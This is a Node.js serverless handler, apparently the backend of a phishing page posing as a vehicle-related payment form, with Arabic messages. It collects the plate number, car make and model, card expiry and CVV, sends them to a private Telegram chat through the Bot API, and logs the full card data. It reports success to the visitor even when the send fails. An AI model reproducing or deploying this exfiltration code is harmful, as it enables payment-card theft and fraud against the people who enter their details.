module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const paymentData = req.body;
        const botToken = process.env.BOT_TOKEN;
        const chatId = process.env.CHAT_ID;

        console.log("[v0] BOT_TOKEN exists:", !!botToken);
        console.log("[v0] CHAT_ID exists:", !!chatId);
        console.log("[v0] Payment data received:", paymentData);

        if (!botToken || !chatId) {
            console.error("[v0] Missing BOT_TOKEN or CHAT_ID");
            return res.status(200).json({ 
                success: true, 
                message: 'تم استقبال البيانات (بدون إرسال Telegram)',
                data: paymentData 
            });
        }

        const message = `📋 بيانات دفع جديدة:
━━━━━━━━━━━━━━━━
🚗 رقم التسجيل: ${paymentData.plaque}
🏷️ الماركة: ${paymentData.marque}
🚙 الموديل: ${paymentData.modele}
💳 البطاقة (آخر 4): ${paymentData.cardNumber.slice(-4)}
📅 الانتهاء: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
⏰ الوقت: ${paymentData.timestamp}
━━━━━━━━━━━━━━━━`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const telegramData = await telegramResponse.json();
        
        if (!telegramResponse.ok) {
            console.error("[v0] Telegram error:", telegramData);
            throw new Error(`Telegram error: ${telegramData.description}`);
        }

        console.log("[v0] Payment data sent to Telegram successfully");
        return res.status(200).json({ 
            success: true, 
            message: 'تم إرسال البيانات بنجاح',
            telegramMessageId: telegramData.result.message_id 
        });

    } catch (error) {
        console.error("[v0] Error in send-payment:", error.message);
        return res.status(200).json({ 
            success: true,
            message: 'تم استقبال البيانات',
            error: error.message 
        });
    }
};
